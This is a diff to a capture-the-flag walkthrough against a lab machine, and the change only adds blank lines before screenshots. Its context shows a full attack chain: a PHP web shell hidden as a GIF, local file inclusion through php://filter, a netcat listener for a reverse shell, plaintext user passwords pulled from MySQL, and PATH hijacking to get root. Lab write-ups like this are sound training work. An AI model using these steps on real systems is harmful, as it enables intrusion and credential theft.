@@ -71,6 +71,7 @@ Login page attempt possible SQL injection
 nikto scan
 
     nikto -h http://192.168.56.101
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549496054854_image.png)
 
 
@@ -114,30 +115,35 @@ We now own creditals to the MySQL server
 Connect to MySQL server:
 
     mysql -h 192.168.56.101 -u root -p
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497412977_image.png)
 
 
 Show the list of databases
 
     SHOW DATABASES
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497720379_image.png)
 
 
 access “Users”
 
     use Users
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497829290_image.png)
 
 
 show Tables
 
     show tables;
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497869086_image.png)
 
 
 retrieve all information from users table
 
     select * from users;
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497990934_image.png)
 
 
@@ -152,6 +158,7 @@ retrieve all information from users table
     JWzXuBJJNy
     SIfdsTEn6I
     iSv5Ym2GRo 
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549498215235_image.png)
 
 
@@ -169,6 +176,7 @@ attempt to upload custom cmd file
 
     GIF89;
     <?php system($_GET["cmd"]) ?>
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549502392579_image.png)
 
 
@@ -183,6 +191,7 @@ upload the created file (pic.png in this example)
 Navigate to upload directory
 
     http://192.168.56.101/upload/
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549557409520_image.png)
 
 
@@ -192,6 +201,7 @@ Navigate to upload directory
 Inspect the index page
 
     http://192.168.56.101/?page=php://filter/convert.base64-encode/resource=index
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549555839059_image.png)
 
 
@@ -258,12 +268,14 @@ add our image location of .png to the cookie field and test the file traversal
     Upgrade-Insecure-Requests: 1
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 0
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549557697840_image.png)
 
 
 now connecting to box - setup listener
 
     nc -lvnp 9000
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549557813199_image.png)
 
 
@@ -281,6 +293,7 @@ now save file as php.php
 setup SimpleHTTPServer standard port 8000 will work
 
     python -m SimpleHTTPServer
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549559872920_image.png)
 
 
@@ -320,6 +333,7 @@ Python method:
     press cntl+z 
     stty raw -echo
     fg (enter)
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549560399091_image.png)
 
 
@@ -337,6 +351,7 @@ switch users to kane
 
     su kane
     password: iSv5Ym2GRo
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549561521329_image.png)
 
 
@@ -345,6 +360,7 @@ switch users to kane
 run msgmike
 
     ./msgmike
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549561619450_image.png)
 
 
@@ -354,6 +370,7 @@ switch users to mike
 
     su mike
     password: SIfdsTEn6I
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549564921990_image.png)
 
 
@@ -366,6 +383,7 @@ more information found: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-e
 echo path
 
     echo $PATH
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549565134838_image.png)
 
 
@@ -387,6 +405,7 @@ change chmod
 export kane’s path
 
     export PATH=/home/kane
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549565821323_image.png)
 
 
@@ -395,6 +414,7 @@ export kane’s path
 Reset PATH variable first
 
     export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549565957051_image.png)
 
 
@@ -403,6 +423,7 @@ Reset PATH variable first
 run msg2root
 
     ./msg2root
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549566046937_image.png)
 
 
